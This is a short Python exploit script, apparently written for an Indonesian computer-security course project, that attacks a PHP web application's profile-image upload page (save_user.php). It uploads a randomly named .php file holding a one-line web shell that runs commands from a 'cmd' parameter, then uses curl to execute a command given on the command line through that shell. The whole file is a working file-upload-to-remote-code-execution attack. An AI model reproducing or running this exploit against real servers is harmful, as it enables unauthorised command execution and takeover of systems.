import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import os
import sys
import string
import random
import time

host = 'localhost' 
path = 'SourceCode' 

url = 'http://'+host+'/'+path+'/pages/save_user.php'

def id_generator(size=6, chars=string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))+'.php'

if len(sys.argv) == 1:
    print("#########")
    print("Tugas Besar Manajemen Keamanan Komputer")
    print("Contoh penggunaan : python3 rce.py command")
    print("#########")
    exit()


filename = id_generator()
print("Membuat "+filename+ " file..")
time.sleep(2)
print("Uploading file..")
time.sleep(2)

   


def reverse():
    command = sys.argv[1]
    multipart_data = MultipartEncoder({
        'image': (filename, '“<?php echo fread(popen($_GET["cmd"], "r"), 4096); ?>', 'application/octet-stream'),
        'btn_save': ''
        })
    r = requests.post(url, data=multipart_data, headers={'Content-Type':multipart_data.content_type})   
    endpoint = 'http://'+host+'/'+path+'/uploadImage/Profile/'+filename+'' 
    urlo = 'http://'+host+'/'+path+'/uploadImage/Profile/'+filename+'?cmd='+command+''
    print("Sukses, file berhasil terunggah : " +endpoint+ "")
    time.sleep(1) 
    print("Executing command in 1 seconds:\n")
    time.sleep(1)
    os.system("curl -X GET "+urlo+"")

reverse()